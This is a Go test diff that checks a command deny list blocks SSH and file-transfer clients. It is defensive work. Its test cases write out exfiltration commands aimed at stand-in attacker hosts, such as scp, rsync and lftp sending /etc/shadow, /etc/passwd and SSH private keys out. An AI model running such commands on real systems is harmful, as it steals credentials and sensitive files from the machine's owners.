@@ -1245,3 +1245,43 @@ func TestIsDenied_BlocksSocat(t *testing.T) {
 		}
 	}
 }
+
+// TestIsDenied_BlocksSSHAndFileTransferClients verifies that ssh, scp, sftp,
+// rsync, ftp, and lftp are denied by DefaultDeniedCommands. These tools open
+// connections to arbitrary remote hosts and can be used to exfiltrate
+// diagnostic data (e.g. /etc/shadow, SSH private keys) or enable lateral
+// movement. Diagnostic SSH access is provided through the controlled Dialer;
+// spawning a separate ssh client process is never needed.
+func TestIsDenied_BlocksSSHAndFileTransferClients(t *testing.T) {
+	denied := [][]string{
+		// ssh: direct connection to attacker-controlled server or lateral movement.
+		{"ssh", "attacker@attacker.example"},
+		{"ssh", "-i", "/root/.ssh/id_rsa", "root@10.0.0.1", "cat", "/etc/shadow"},
+		{"/usr/bin/ssh", "-o", "StrictHostKeyChecking=no", "user@evil.example"},
+		// Bare ssh with no arguments must also be denied.
+		{"ssh"},
+		// scp: file copy over SSH — can push local files to a remote host.
+		{"scp", "/etc/shadow", "attacker@evil.example:/tmp/"},
+		{"scp", "-i", "/root/.ssh/id_rsa", "/etc/passwd", "user@10.0.0.1:/tmp/"},
+		{"/usr/bin/scp", "/home/monitor/.ssh/id_rsa", "attacker@evil.example:/tmp/"},
+		// sftp: interactive file transfer over SSH.
+		{"sftp", "attacker@evil.example"},
+		{"/usr/bin/sftp", "-i", "/root/.ssh/id_rsa", "user@10.0.0.1"},
+		// rsync: efficient file sync that can push data to a remote host.
+		{"rsync", "-avz", "/etc/", "attacker@evil.example:/tmp/stolen/"},
+		{"rsync", "--archive", "/home/monitor/", "rsync://evil.example/data/"},
+		{"/usr/bin/rsync", "-r", "/var/log/", "user@attacker.example:/tmp/"},
+		// ftp: plaintext file transfer to arbitrary remote servers.
+		{"ftp", "evil.example"},
+		{"/usr/bin/ftp", "-n", "attacker.example"},
+		// lftp: advanced interactive FTP/SFTP/HTTP client.
+		{"lftp", "ftp://evil.example"},
+		{"lftp", "-e", "put /etc/shadow; quit", "ftp://attacker.example"},
+		{"/usr/bin/lftp", "sftp://attacker@evil.example"},
+	}
+	for _, argv := range denied {
+		if !isDenied(DefaultDeniedCommands, argv) {
+			t.Errorf("expected SSH/file-transfer client denied: %v", argv)
+		}
+	}
+}
